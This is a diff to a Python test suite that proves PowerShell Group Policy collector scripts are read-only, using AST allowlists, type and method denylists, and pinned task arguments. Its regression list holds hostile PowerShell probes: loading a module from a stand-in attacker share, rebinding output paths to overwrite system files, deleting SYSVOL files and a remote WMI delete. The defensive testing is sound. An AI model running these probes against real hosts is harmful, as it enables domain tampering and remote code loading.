@@ -1,33 +1,38 @@
-"""Collector read-only enforcement by PowerShell AST allowlist.
+"""Collector read-only enforcement by a closed-world PowerShell AST inventory.
 
 The collection scripts run on a domain controller or RSAT host with a domain
 account. gpo-lens claims they are read-only against Active Directory, Group
 Policy and SYSVOL. This test turns that claim from "by inspection" into a
-mechanical check: it **parses** (never executes) each in-scope script with the
-PowerShell language parser (``tests/powershell/Get-ScriptCallInventory.ps1``)
-and fails on anything outside an explicit ALLOWLIST:
+mechanical check that **parses** (never executes) each in-scope script with the
+PowerShell language parser (``tests/powershell/Get-ScriptCallInventory.ps1``).
 
-* every command invocation (cmdlet, function, external program);
-* every dynamic invocation (``&`` / ``.`` with a computed target), pinned by
-  its exact source text;
-* every static .NET method call (``[Type]::Method``) by type and member;
-* every instance .NET method call by member name (the receiver type is not
-  statically known; see "Limits" below);
-* every property assignment on an object (``$x.Prop = ...``);
-* ``New-Object`` type names (``-ComObject`` is never allowed);
-* ``Add-Type`` arguments: an assembly name, or an inline C# definition pinned
-  by SHA-256 because its body is invisible to the PowerShell AST.
+Two layers, completeness by construction:
 
-The allowlist is strict in both directions: an entry that a script no longer
-uses also fails, so the list cannot rot into a permissive superset.
+1. **Closed-world golden inventory.** ``tests/powershell/collector-inventory.json``
+   records a normalized form of *every* side-effect-capable node — each command
+   with its full ordered argument vector (named parameters incl. common
+   parameters, and positional arguments), each member call with its receiver,
+   each assignment, each redirection, each ``using`` statement, and every type
+   reference. ``test_inventory_matches_golden`` fails on ANY difference. A new
+   attack construct therefore cannot slip through a gap in the rules below: it
+   is simply not in the committed inventory, and a reviewer sees the diff.
+   Regenerate with ``scripts/gen_collector_inventory.py`` (it refuses to write
+   unless layer 2 passes, so a regeneration cannot launder a bypass).
 
-Local file writes are allowed only to the collection's own outputs. Each
-file-writing command or method must target an expression built only from the
-variables named in that script's ``write_roots`` (each documented below with
-its derivation from ``-OutputRoot``, ``-OutputPath`` or ``-CopyTo``), and must
-not contain an absolute path, UNC path or ``..`` literal. That the named
-variables derive from those parameters is verified by inspection, recorded in
-the ``write_roots`` descriptions; the AST check pins the variable names.
+2. **Semantic allowlist** (``run_all_checks``), strict in both directions
+   (an unused entry also fails): commands, dynamic invocations, static/instance
+   .NET calls, property writes, redirections (``$null`` only), ``using``
+   statements (none), ``New-Object``/``Add-Type`` forms, a type-reference
+   denylist (``[ADSI]``/``System.DirectoryServices.*``/COM/WMI/CIM/runspace),
+   dataflow confinement of write/exec roots, pinned write-target expressions,
+   and exact scheduled-task argument vectors.
+
+Write confinement is dataflow, not textual: each write-root (and each variable
+reaching ``& $CollectorPath`` or the scheduled-task action) is pinned to its
+documented binding(s). A rebind via ``=``, a scope prefix (``$script:``), a
+``foreach`` loop variable, or a variable-writing common parameter
+(``-OutVariable`` …) is rejected, and every write target must be exactly one of
+a committed set of pinned path expressions (no free child data).
 
 Scope:
 
@@ -35,24 +40,15 @@ Scope:
   ``Export-GroupMembers.ps1``, ``Export-Principals.ps1``,
   ``Run-GpoLensCollection.ps1``, ``GpoLensCollectionMarker.ps1``.
 * ``Register-GpoLensCollection.ps1`` also runs on the DC/RSAT host but its job
-  is to create a Windows scheduled task, which is a write to the host (not to
-  AD). It has its own narrow allowlist that names the ScheduledTasks cmdlets.
+  is to create a Windows scheduled task (a write to the host, not to AD). Each
+  ScheduledTasks cmdlet call must match a pinned argument vector exactly.
 * Out of scope: ``install-windows.ps1`` / ``uninstall-windows.ps1`` run on the
-  *analysis* host (IIS install), never on a DC, and legitimately install
-  software, write IIS configuration and firewall rules.
+  *analysis* host (IIS install), never on a DC.
 
-Limits (stated, not hidden):
-
-* Instance methods are matched by name only. ``.Delete()`` on a ZIP entry and
-  on a hypothetical directory object look the same; each allowlisted instance
-  name is therefore per script and justified by the objects that script
-  creates.
-* ``& $CollectorPath`` in the runner executes the script path the operator
-  registered. The default is ``Export-GpoEstate.ps1`` (checked here); a custom
-  ``-CollectorPath`` is operator-supplied code and outside this guarantee.
-* Read-only is about Active Directory, Group Policy and SYSVOL. The AD and
-  GroupPolicy cmdlets in the allowlist are all ``Get-*`` cmdlets; Microsoft's
-  documentation is the authority for those cmdlets not writing.
+Residual limits are stated in ``docs/threat-model.md`` R5 (static analysis of
+the committed scripts only; instance methods bound by receiver *variable name*
+with a type denylist backstop; a runtime ``-CollectorPath`` override; the
+``Get-*`` cmdlets' read-only behavior rests on Microsoft's documentation).
 """
 
 from __future__ import annotations
@@ -456,6 +452,7 @@ PINNED_VARS: dict[str, dict[str, frozenset[str]]] = {
         "folder": frozenset({"Join-Path $OutputRoot $archive.BaseName"}),
         # Exec sink: the runner invokes `& $CollectorPath`.
         "collectorpath": frozenset(),
+        "taskname": frozenset(),
     },
     "GpoLensCollectionMarker.ps1": {
         "marker": frozenset({"Join-Path $root.FullName '.gpo-lens-collection-owner'"}),
@@ -471,6 +468,7 @@ PINNED_VARS: dict[str, dict[str, frozenset[str]]] = {
             }
         ),
         "account": frozenset({"if ($GmsaAccount) { $GmsaAccount } else { $ServiceAccount }"}),
+        "taskname": frozenset(),
         "windowsroot": frozenset(
             {"if ($env:SystemRoot) { $env:SystemRoot } else { 'C:\\Windows' }"}
         ),
@@ -550,24 +548,182 @@ INSTANCE_RECEIVERS: dict[str, dict[str, frozenset[str]]] = {
 }
 
 # Register-GpoLensCollection is the only script that writes a scheduled task.
-# Pin the security-relevant arguments of every task cmdlet so a modified
-# -Execute / -Argument / -UserId / -TaskName (Sol task_abuse, DeepSeek NB-2)
-# fails even though the cmdlet name is allowlisted.
-TASK_ACTION: dict[str, dict[str, str]] = {
-    "New-ScheduledTaskAction": {
-        "Execute": '"$windowsRoot\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"',
-        "Argument": "$taskArgs",
-    },
-    "New-ScheduledTaskPrincipal": {"UserId": "$account"},
-    "New-ScheduledTask": {"Action": "$action", "Principal": "$principal"},
-    "Register-ScheduledTask": {"TaskName": "$TaskName", "InputObject": "$task"},
+# Each task cmdlet call must match one of these EXACT argument vectors (a frozen
+# set of (parameter, normalized value) pairs, switch params valued None). An
+# extra, missing or changed argument — a wildcard `-TaskName '*'`, a `-CimSession`
+# remote target, `-RunLevel Highest`, a different `-Execute`/`-Argument` — matches
+# no vector and fails (Sol task_abuse / taskname / unregister / cimsession /
+# runlevel; DeepSeek NB-2). `Unregister-ScheduledTask` is included, so a
+# wildcard deletion is rejected.
+_PS = '"$windowsRoot\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"'
+TaskVector = frozenset[tuple[str, str | None]]
+TASK_ARG_VECTORS: dict[str, frozenset[TaskVector]] = {
+    "New-ScheduledTaskAction": frozenset(
+        {
+            frozenset(
+                {("Execute", _PS), ("Argument", "$taskArgs"), ("WorkingDirectory", "$PSScriptRoot")}
+            )
+        }
+    ),
+    "New-ScheduledTaskPrincipal": frozenset(
+        {frozenset({("UserId", "$account"), ("LogonType", "Password"), ("RunLevel", "Limited")})}
+    ),
+    "New-ScheduledTaskTrigger": frozenset(
+        {frozenset({("Daily", None), ("DaysInterval", "$EveryDays"), ("At", "$scheduleTime")})}
+    ),
+    "New-ScheduledTaskSettingsSet": frozenset(
+        {
+            frozenset(
+                {
+                    ("ExecutionTimeLimit", "$ExecutionTimeLimit"),
+                    ("MultipleInstances", "IgnoreNew"),
+                    ("StartWhenAvailable", None),
+                }
+            )
+        }
+    ),
+    "New-ScheduledTask": frozenset(
+        {
+            frozenset(
+                {
+                    ("Action", "$action"),
+                    ("Trigger", "$trigger"),
+                    ("Principal", "$principal"),
+                    ("Settings", "$settings"),
+                    (
+                        "Description",
+                        "'Read-only GPO export, bounded retention, rotating logs and "
+                        "optional ZIP delivery.'",
+                    ),
+                }
+            )
+        }
+    ),
+    "Register-ScheduledTask": frozenset(
+        {
+            frozenset({("TaskName", "$TaskName"), ("InputObject", "$task"), ("Force", None)}),
+            frozenset(
+                {
+                    ("TaskName", "$TaskName"),
+                    ("InputObject", "$task"),
+                    ("User", "$ServiceAccount"),
+                    ("Password", "$taskPassword"),
+                    ("Force", None),
+                }
+            ),
+        }
+    ),
+    "Unregister-ScheduledTask": frozenset(
+        {frozenset({("TaskName", "$TaskName"), ("Confirm", "$false")})}
+    ),
 }
 _TASK_ACTION_SCRIPT = "Register-GpoLensCollection.ps1"
 
-# .NET type names (casefolded substrings) that are an AD/COM/runspace write or
-# code-load surface. Rejected wherever they appear (cast, type literal, `using`),
-# because an [ADSI]/[DirectoryEntry] receiver carries an AD write under an
-# allowlisted instance-method name.
+# PowerShell common parameters that WRITE a named variable; an allowlisted read
+# command can thereby rebind a pinned path/exec variable (Sol BL-1). Rejected
+# outright (names, their unambiguous prefixes, and the -ov/-pv/... aliases).
+_VARIABLE_WRITING_PARAMS = frozenset(
+    {"OutVariable", "PipelineVariable", "ErrorVariable", "WarningVariable", "InformationVariable"}
+)
+_VARIABLE_PARAM_TOKENS = frozenset(
+    {"ov", "pv", "ev", "wv", "iv"}
+    | {name[:i].casefold() for name in _VARIABLE_WRITING_PARAMS for i in range(3, len(name) + 1)}
+)
+
+# Instance methods that cause an external side effect (file/AD/registry/object
+# mutation or a stream open/write). These require a receiver that is an
+# allowlisted, pinned variable; a parenthesized/command receiver (receiver_var
+# null) is rejected (Sol BL-2). Pure read/string/collection methods do not.
+_SIDE_EFFECTING_METHODS = frozenset(
+    {
+        "Delete",
+        "Open",
+        "OpenWrite",
+        "OpenRead",
+        "Create",
+        "CreateEntry",
+        "CreateSubdirectory",
+        "Write",
+        "WriteByte",
+        "WriteLine",
+        "CopyTo",
+        "MoveTo",
+        "Replace",
+        "SetInfo",
+        "CommitChanges",
+        "Put",
+        "PutEx",
+        "Save",
+        "SetValue",
+        "DeleteValue",
+        "InvokeSet",
+    }
+)
+
+# A pinned root may legitimately be bound by a `foreach ($v in ...)` loop only
+# where the real script does so (Run iterates `$archive` over the expired
+# exports). Any other foreach binding of a pinned root is a rebind (DeepSeek
+# NEW-BL-2), as is a `foreach` whose source carries an absolute/UNC/provider
+# path.
+FOREACH_ALLOWED_ROOTS: dict[str, frozenset[str]] = {
+    "Run-GpoLensCollection.ps1": frozenset({"archive"}),
+}
+# PowerShell scope prefixes stripped before a pinned-variable lookup, so
+# `$script:OutputRoot` / `$global:OutputRoot` cannot dodge the pin (NEW-BL-2).
+_SCOPE_PREFIXES = ("script:", "global:", "local:", "private:", "using:", "variable:")
+
+# Every write-path argument must be exactly one of these pinned expressions per
+# script (normalized). No free child data: `Join-Path $root $segment`, a
+# `$env:` component, a literal/computed `..`, or `New-Item -Name` are not in the
+# set and fail (Sol BL-4).
+WRITE_TARGET_EXPRESSIONS: dict[str, frozenset[str]] = {
+    "Export-GpoEstate.ps1": frozenset(
+        {
+            "$OutputRoot",
+            "$archive",
+            "$dest",
+            "$testFile",
+            '(Join-Path $out "reports\\${safe}__$($gpo.Id).xml")',
+            "(Join-Path $out 'AllGPOs.xml')",
+            "(Join-Path $out 'collection-errors.json')",
+            "(Join-Path $out 'gp-inheritance.json')",
+            "(Join-Path $out 'gpo-inventory.json')",
+            "(Join-Path $out 'gpo-metadata.json')",
+            "(Join-Path $out 'group-members.json')",
+            "(Join-Path $out 'ou-tree.json')",
+            "(Join-Path $out 'principals.json')",
+            "(Join-Path $out 'reports')",
+            "(Join-Path $out 'sites.json')",
+            "(Join-Path $out 'wmi-filters.json')",
+        }
+    ),
+    "Export-GroupMembers.ps1": frozenset({"$OutputPath"}),
+    "Export-Principals.ps1": frozenset({"$OutputPath"}),
+    "Run-GpoLensCollection.ps1": frozenset(
+        {
+            "$CopyTo",
+            "$LogPath",
+            "$archive.FullName",
+            "$delivery",
+            "$folder",
+            "$newest.FullName",
+            "$next",
+            "$old",
+            "$partial",
+            "(Join-Path $OutputRoot 'collection.lock')",
+            "(Join-Path $exportDir 'gpo-inventory.json')",
+        }
+    ),
+    "GpoLensCollectionMarker.ps1": frozenset({"$Marker", "$marker"}),
+    "Register-GpoLensCollection.ps1": frozenset(
+        {"$OutputRoot", "$marker", "(Join-Path $OutputRoot 'collection.lock')"}
+    ),
+}
+
+# .NET type names (casefolded substrings) that are an AD/COM/WMI/runspace write
+# or code-load surface. Rejected wherever they appear (cast, type literal,
+# `using`), because such a receiver carries a write under an allowlisted
+# instance-method name.
 _FORBIDDEN_TYPE_SUBSTRINGS = (
     "adsi",
     "adsisearcher",
@@ -580,6 +736,14 @@ _FORBIDDEN_TYPE_SUBSTRINGS = (
     "runspace",
     "powershell",
     "scriptblock",
+    "wmi",
+    "wmiclass",
+    "wmisearcher",
+    "cimsession",
+    "cimclass",
+    "ciminstance",
+    "managementobject",
+    "managementclass",
 )
 
 # File-writing commands and the bound parameters that name what they write.
@@ -631,6 +795,19 @@ _UNC_OR_DOTDOT = re.compile(r"\\\\|(?:^|[\\/'\" ])\.\.(?:[\\/'\" ]|$)")
 
 def _cf(name: str) -> str:
     return name.casefold()
+
+
+def _bare_var(name: str) -> str:
+    """Casefold a variable name with any scope prefix stripped.
+
+    ``$script:OutputRoot`` -> ``outputroot`` so a scoped assignment cannot dodge
+    the pinned-variable lookup (DeepSeek NEW-BL-2).
+    """
+    cf = _cf(name)
+    for prefix in _SCOPE_PREFIXES:
+        if cf.startswith(prefix):
+            return cf[len(prefix) :]
+    return cf
 
 
 def _vars_in(text: str) -> set[str]:
@@ -728,13 +905,43 @@ def check_instance_receivers(script: str, entry: dict[str, Any]) -> None:
         name = member["member"]
         receiver_var = member["receiver_var"]
         if receiver_var is None:
-            # Static-type or literal receiver; screened by check_types.
+            # No pinnable receiver variable. A side-effecting method on a
+            # parenthesized/command result ((Get-Item x).Delete(), FileInfo
+            # .CopyTo, [WMI]...Delete()) is rejected; a pure read/string method
+            # (e.g. ($_ | Out-String).TrimEnd()) is fine (type denylist already
+            # screened any type-literal receiver).
+            assert name not in _SIDE_EFFECTING_METHODS, (
+                f"{script}:{member['line']}: side-effecting method {name!r} on a non-variable "
+                f"receiver {member['receiver']!r} (needs a pinned receiver variable)"
+            )
             continue
         permitted = allowed.get(name, frozenset())
         assert _cf(receiver_var) in permitted, (
             f"{script}:{member['line']}: instance method {name!r} called on unexpected receiver "
             f"${receiver_var} (allowed: {sorted(permitted)})"
         )
+
+
+def _is_variable_param(param: str) -> bool:
+    token = _cf(param)
+    return token in _VARIABLE_PARAM_TOKENS or token.endswith("variable")
+
+
+def _common_param_writes(entry: dict[str, Any]) -> list[tuple[int, str]]:
+    """(line, target variable) for every -OutVariable/-ErrorVariable/... use.
+
+    These bind a variable with no assignment AST node (Sol BL-1); the target is
+    run through the same confinement as an ``=`` assignment, so one that targets
+    a pinned write/exec variable is rejected while the collector's own
+    ``-ErrorVariable +zipEnumErr`` (a non-pinned sink) is allowed.
+    """
+    writes: list[tuple[int, str]] = []
+    for command in entry["commands"]:
+        for arg in command["arguments"]:
+            if arg["parameter"] and _is_variable_param(str(arg["parameter"])):
+                target = _norm(str(arg["value"] or "")).lstrip("+").strip("'\"$")
+                writes.append((command["line"], target))
+    return writes
 
 
 def check_usings(script: str, entry: dict[str, Any]) -> None:
@@ -807,23 +1014,22 @@ def check_writes(script: str, entry: dict[str, Any]) -> None:
     assert roots <= set(PINNED_VARS[script]), (
         f"{script}: every write root must be pinned: {roots - set(PINNED_VARS[script])}"
     )
-    used_roots: set[str] = set()
+    pinned_targets = WRITE_TARGET_EXPRESSIONS[script]
+    used: set[str] = set()
     for line, text in _write_targets(entry):
-        names = _vars_in(text)
-        # The target must be ANCHORED at a declared, pinned root. Other variables
-        # (sanitized filename components such as $safe / $gpo.Id joined under the
-        # root) are allowed, but the anchoring root is pinned (check_pinned_
-        # bindings) so it cannot be a rebound UNC/provider path, and a literal
-        # absolute / UNC / provider / .. anywhere in the target fails here.
-        anchor = names & roots
-        assert anchor, (
-            f"{script}:{line}: write target {text!r} is not anchored at a declared root "
-            f"(vars {sorted(names)})"
+        norm = _norm(text)
+        # Closed set: the write target must be exactly one of the pinned path
+        # expressions. This refuses `Join-Path $root $childData`, a `$env:` or
+        # `..` component, and any computed child (Sol BL-4); the anchoring root
+        # is separately pinned (check_pinned_bindings).
+        assert norm in pinned_targets, (
+            f"{script}:{line}: write target {norm!r} is not a pinned path expression"
         )
-        assert not _ABSOLUTE_LITERAL.search(text), f"{script}:{line}: absolute/UNC/.. in {text!r}"
-        assert not _PROVIDER.search(text), f"{script}:{line}: provider path in {text!r}"
-        used_roots |= anchor
-    # New-Item must not create links or target a non-filesystem provider.
+        assert not _ABSOLUTE_LITERAL.search(norm), f"{script}:{line}: absolute/UNC/.. in {norm!r}"
+        assert not _PROVIDER.search(norm), f"{script}:{line}: provider path in {norm!r}"
+        used.add(norm)
+    # New-Item must not create links, target a provider, or carry a -Name
+    # component (another path segment, Sol BL-4), -Value or -Target path.
     for command in entry["commands"]:
         if command["name"] != "New-Item":
             continue
@@ -835,19 +1041,23 @@ def check_writes(script: str, entry: dict[str, Any]) -> None:
         assert "PSProvider" not in bound, (
             f"{script}:{command['line']}: New-Item -PSProvider blocked"
         )
+        assert "Name" not in bound, (
+            f"{script}:{command['line']}: New-Item -Name is a path component and is not allowed"
+        )
         for key in ("Value", "Target"):
             value = bound.get(key)
             if isinstance(value, str):
                 assert not _ABSOLUTE_LITERAL.search(value) and not _PROVIDER.search(value), (
                     f"{script}:{command['line']}: New-Item -{key} {value!r} escapes the roots"
                 )
-    _exact("write roots", script, used_roots, frozenset(roots))
+    _exact("write-target expressions", script, used, pinned_targets)
 
 
 def check_pinned_bindings(script: str, entry: dict[str, Any]) -> None:
     pinned = PINNED_VARS[script]
+    foreach_ok = FOREACH_ALLOWED_ROOTS.get(script, frozenset())
     for binding in entry["variable_assignments"]:
-        name = _cf(binding["name"])
+        name = _bare_var(binding["name"])  # scope-stripped (NEW-BL-2)
         if name not in pinned:
             continue
         rhs = _norm(binding["rhs"])
@@ -856,50 +1066,228 @@ def check_pinned_bindings(script: str, entry: dict[str, Any]) -> None:
                 f"{script}:{binding['line']}: ${binding['name']} reassigned to an undocumented "
                 f"value {rhs!r} (a confined write/exec root cannot be rebound)"
             )
-        else:  # param default or foreach source: no UNC/provider/.. literal
+        elif binding["kind"] == "foreach":
+            # A pinned root may be a foreach variable only where the real script
+            # does so, and its source must carry no absolute/UNC/provider path.
+            assert name in foreach_ok, (
+                f"{script}:{binding['line']}: ${binding['name']} is a pinned root and may not be "
+                "rebound by a foreach loop variable"
+            )
+            assert not _ABSOLUTE_LITERAL.search(rhs) and not _PROVIDER.search(rhs), (
+                f"{script}:{binding['line']}: foreach source {rhs!r} for pinned ${binding['name']} "
+                "carries an absolute/UNC/provider path"
+            )
+        else:  # parameter default: no UNC/provider/.. literal (drive-absolute ok)
             assert not _UNC_OR_DOTDOT.search(rhs) and not _PROVIDER.search(rhs), (
                 f"{script}:{binding['line']}: ${binding['name']} bound via {binding['kind']} to an "
                 f"unsafe path {rhs!r}"
             )
+    # A variable-writing common parameter (-OutVariable etc.) binding a pinned
+    # variable is a rebind with no assignment node (Sol BL-1 / DeepSeek NEW-BL-3).
+    for line, target in _common_param_writes(entry):
+        assert _bare_var(target) not in pinned, (
+            f"{script}:{line}: a variable-writing common parameter rebinds pinned ${target}"
+        )
+
+
+def _arg_vector(command: dict[str, Any]) -> TaskVector:
+    return frozenset(
+        (str(a["parameter"]), _norm(a["value"]) if a["value"] is not None else None)
+        for a in command["arguments"]
+        if a["parameter"]
+    )
 
 
 def check_task_action(script: str, entry: dict[str, Any]) -> None:
     if script != _TASK_ACTION_SCRIPT:
         for command in entry["commands"]:
-            assert command["name"] not in TASK_ACTION, (
+            assert command["name"] not in TASK_ARG_VECTORS, (
                 f"{script}:{command['line']}: scheduled-task cmdlet outside the registration script"
             )
         return
     for command in entry["commands"]:
-        pins = TASK_ACTION.get(command["name"] or "")
-        if pins is None:
+        vectors = TASK_ARG_VECTORS.get(command["name"] or "")
+        if vectors is None:
             continue
-        bound = command["bound"]
-        for param, expected in pins.items():
-            actual = bound.get(param)
-            assert isinstance(actual, str) and _norm(actual) == _norm(expected), (
-                f"{script}:{command['line']}: {command['name']} -{param} is {actual!r}, "
-                f"must be {expected!r}"
-            )
+        # The full argument vector must match one pinned vector exactly. An
+        # extra -CimSession, a wildcard -TaskName, -RunLevel Highest, or any
+        # other changed/added argument matches none and fails.
+        actual = _arg_vector(command)
+        assert actual in vectors, (
+            f"{script}:{command['line']}: {command['name']} argument vector {sorted(actual)} "
+            f"matches no pinned vector"
+        )
 
 
-def run_all_checks(script: str, inv: dict[str, dict[str, Any]]) -> None:
+# Named semantic checks, in run order. Each takes (script, entry); the two that
+# also need the local function set are wrapped. The names are what the
+# regression suite asserts against (NON-BL-3).
+def _named_checks(local: set[str]) -> dict[str, Any]:
+    return {
+        "commands": lambda s, e: check_commands(s, e, local),
+        "dotnet": check_dotnet,
+        "types": check_types,
+        "instance_receivers": check_instance_receivers,
+        "usings": check_usings,
+        "redirections": check_redirections,
+        "new_object_and_add_type": check_new_object_and_add_type,
+        "writes": check_writes,
+        "pinned_bindings": check_pinned_bindings,
+        "task_action": check_task_action,
+    }
+
+
+def _run_checks(script: str, inv: dict[str, dict[str, Any]]) -> set[str]:
+    """Run every semantic check; return the set of check names that raised.
+
+    ``parse_errors`` is reported as the pseudo-check ``parse`` so the regression
+    suite can require a *substantive* check (not a parse failure) to flag a probe.
+    """
     policy = POLICIES[script]
     entry = inv[script]
-    assert entry["parse_errors"] == []
     local = set(entry["functions"])
     for source in policy.dot_sources:
         local |= set(inv[source]["functions"])
-    check_commands(script, entry, local)
-    check_dotnet(script, entry)
-    check_types(script, entry)
-    check_instance_receivers(script, entry)
-    check_usings(script, entry)
-    check_redirections(script, entry)
-    check_new_object_and_add_type(script, entry)
-    check_writes(script, entry)
-    check_pinned_bindings(script, entry)
-    check_task_action(script, entry)
+    failed: set[str] = set()
+    if entry["parse_errors"]:
+        failed.add("parse")
+    for check_name, fn in _named_checks(local).items():
+        try:
+            fn(script, entry)
+        except AssertionError:
+            failed.add(check_name)
+    return failed
+
+
+def run_all_checks(script: str, inv: dict[str, dict[str, Any]]) -> None:
+    entry = inv[script]
+    assert entry["parse_errors"] == [], f"{script}: {entry['parse_errors']}"
+    failed = {c for c in _run_checks(script, inv) if c != "parse"}
+    assert not failed, f"{script}: checks failed: {sorted(failed)}"
+
+
+# ---------------------------------------------------------------------------
+# Closed-world golden inventory. The committed file records EVERY
+# side-effect-capable node (commands with their full argument vector, member
+# invocations with receiver, assignments, redirections, type references) for
+# each in-scope script. The test fails on ANY difference, so a new attack form
+# cannot slip through a gap in the semantic rules above — it is simply not in
+# the committed inventory. Regenerate with scripts/gen_collector_inventory.py,
+# which refuses to write unless run_all_checks passes for every script.
+# ---------------------------------------------------------------------------
+
+GOLDEN_PATH = _REPO / "tests" / "powershell" / "collector-inventory.json"
+
+
+def _canonical(entry: dict[str, Any]) -> dict[str, Any]:
+    def cmd(c: dict[str, Any]) -> dict[str, Any]:
+        return {
+            "name": c["name"],
+            "invocation": c["invocation"],
+            "args": [
+                [a["parameter"], _norm(a["value"]) if a["value"] is not None else None]
+                for a in c["arguments"]
+            ],
+            "type_definition_sha256": c["type_definition_sha256"],
+        }
+
+    def member(m: dict[str, Any]) -> dict[str, Any]:
+        return {
+            "static": m["static"],
+            "type": m["type"],
+            "member": m["member"],
+            "receiver": _norm(m["receiver"]),
+            "receiver_var": m["receiver_var"],
+            "receiver_types": sorted(m["receiver_types"]),
+        }
+
+    def assign(a: dict[str, Any]) -> dict[str, Any]:
+        return {
+            "name": a["name"],
+            "scope": a["scope"],
+            "operator": a["operator"],
+            "kind": a["kind"],
+            "rhs": _norm(a["rhs"]),
+        }
+
+    def by_line(items: list[dict[str, Any]]) -> list[dict[str, Any]]:
+        return sorted(items, key=lambda d: json.dumps(d, sort_keys=True))
+
+    return {
+        "parse_errors": entry["parse_errors"],
+        "functions": sorted(entry["functions"]),
+        "commands": by_line([cmd(c) for c in entry["commands"]]),
+        "members": by_line([member(m) for m in entry["members"]]),
+        "assignments": by_line(
+            [assign(a) for a in entry["variable_assignments"]]
+            + [
+                {
+                    "name": None,
+                    "scope": "",
+                    "operator": "member",
+                    "kind": "member",
+                    "rhs": _norm(a["target"]),
+                }
+                for a in entry["member_assignments"]
+            ]
+        ),
+        "redirections": by_line(
+            [
+                {"kind": r["kind"], "from": r["from_stream"], "to": _norm(r["location"])}
+                for r in entry["redirections"]
+            ]
+        ),
+        "indirect_writes": by_line(
+            [{"command": w["command"], "text": _norm(w["text"])} for w in entry["indirect_writes"]]
+        ),
+        "using_statements": by_line(
+            [{"kind": u["kind"], "name": _norm(u["name"])} for u in entry["using_statements"]]
+        ),
+        "type_references": sorted(set(entry["type_references"])),
+    }
+
+
+def build_full_inventory(inv: dict[str, dict[str, Any]]) -> dict[str, Any]:
+    return {script: _canonical(inv[script]) for script in sorted(POLICIES)}
+
+
+def write_golden_inventory(exe: str) -> dict[str, Any]:
+    """Build, semantically validate, and write the golden inventory.
+
+    The generator refuses to write unless the semantic checks pass for every
+    script, so a regeneration cannot launder a bypass into the committed file.
+    """
+    inv = _run_dumper(exe, [str(_SCRIPTS / name) for name in sorted(POLICIES)])
+    for script in POLICIES:
+        run_all_checks(script, inv)
+    golden = build_full_inventory(inv)
+    GOLDEN_PATH.write_text(json.dumps(golden, indent=2, sort_keys=True) + "\n", encoding="utf-8")
+    return golden
+
+
+def test_inventory_matches_golden(inventory: dict[str, dict[str, Any]]) -> None:
+    assert GOLDEN_PATH.exists(), (
+        "tests/powershell/collector-inventory.json is missing; "
+        "run `python scripts/gen_collector_inventory.py`"
+    )
+    committed = json.loads(GOLDEN_PATH.read_text(encoding="utf-8"))
+    current = build_full_inventory(inventory)
+    if committed != current:
+        import difflib
+
+        diff = "\n".join(
+            difflib.unified_diff(
+                json.dumps(committed, indent=2, sort_keys=True).splitlines(),
+                json.dumps(current, indent=2, sort_keys=True).splitlines(),
+                fromfile="committed",
+                tofile="current",
+                lineterm="",
+            )[:80]
+        )
+        raise AssertionError(
+            "collector call-site inventory changed. A reviewer must confirm the diff, then "
+            "regenerate with `python scripts/gen_collector_inventory.py`:\n" + diff
+        )
 
 
 def test_every_script_is_classified() -> None:
@@ -1157,7 +1545,280 @@ _REGRESSIONS: list[tuple[str, str, str, str]] = [
         "append",
         "Import-Module '\\\\attacker.example.test\\share\\Evil.psm1'\n",
     ),
+    # --- Sol round-2 candidates (19), each previously accepted ---
+    # BL-1: variable-writing common parameters rebind a pinned variable.
+    (
+        "r2_outvariable_rebind_root",
+        "Export-GpoEstate.ps1",
+        "append",
+        "Get-Item -LiteralPath 'C:\\Windows\\win.ini' -OutVariable OutputRoot | Out-Null\n"
+        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
+    ),
+    (
+        "r2_pipelinevariable_rebind_root",
+        "Export-GpoEstate.ps1",
+        "append",
+        "Get-Item -LiteralPath 'C:\\Windows\\win.ini' -PipelineVariable OutputRoot | "
+        "ForEach-Object { Set-Content -LiteralPath $OutputRoot -Value 'owned' }\n",
+    ),
+    (
+        "r2_errorvariable_rebind_root",
+        "Export-GpoEstate.ps1",
+        "append",
+        "Write-Error 'C:\\Windows\\Temp\\gate.txt' -ErrorVariable OutputRoot "
+        "-ErrorAction SilentlyContinue\n"
+        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
+    ),
+    (
+        "r2_warningvariable_rebind_root",
+        "Export-GpoEstate.ps1",
+        "append",
+        "Write-Warning 'C:\\Windows\\Temp\\gate.txt' -WarningVariable OutputRoot\n"
+        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
+    ),
+    (
+        "r2_informationvariable_rebind_root",
+        "Export-GpoEstate.ps1",
+        "append",
+        "Write-Host 'C:\\Windows\\Temp\\gate.txt' -InformationVariable OutputRoot\n"
+        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
+    ),
+    (
+        "r2_collectorpath_outvariable_override",
+        "Run-GpoLensCollection.ps1",
+        "append",
+        "Get-Item -LiteralPath '\\\\attacker.example.test\\share\\Mutate.ps1' "
+        "-OutVariable CollectorPath | Out-Null\n",
+    ),
+    (
+        "r2_taskargs_outvariable_override",
+        "Register-GpoLensCollection.ps1",
+        "append",
+        "Get-Item -LiteralPath '\\\\attacker.example.test\\share\\payload.ps1' "
+        "-OutVariable taskArgs | Out-Null\n",
+    ),
+    # BL-2: receiver-less / parenthesized receivers on side-effecting methods.
+    (
+        "r2_parenthesized_receiver_delete",
+        "Run-GpoLensCollection.ps1",
+        "append",
+        "(Get-Item -LiteralPath "
+        "'\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\victim.xml').Delete()\n",
+    ),
+    (
+        "r2_parenthesized_receiver_open_write",
+        "Run-GpoLensCollection.ps1",
+        "append",
+        "(Get-Item -LiteralPath 'C:\\Windows\\win.ini')."
+        "Open([IO.FileMode]::Open, [IO.FileAccess]::Write).Write([byte[]](65), 0, 1)\n",
+    ),
+    (
+        "r2_parenthesized_fileinfo_copyto_sysvol",
+        "GpoLensCollectionMarker.ps1",
+        "append",
+        "(Get-Item -LiteralPath 'C:\\Windows\\win.ini')."
+        "CopyTo('\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\evil.ini', $true)\n",
+    ),
+    (
+        "r2_wmi_remote_instance_delete",
+        "Run-GpoLensCollection.ps1",
+        "append",
+        "([WMI]'\\\\server.example.test\\root\\cimv2:Win32_Environment.Name=\"GATE\"').Delete()\n",
+    ),
+    # BL-3: scheduled-task operation not pinned.
+    (
+        "r2_taskname_direct_rebind",
+        "Register-GpoLensCollection.ps1",
+        "append",
+        "$TaskName = '\\Microsoft\\Windows\\Defrag\\ScheduledDefrag'\n",
+    ),
+    (
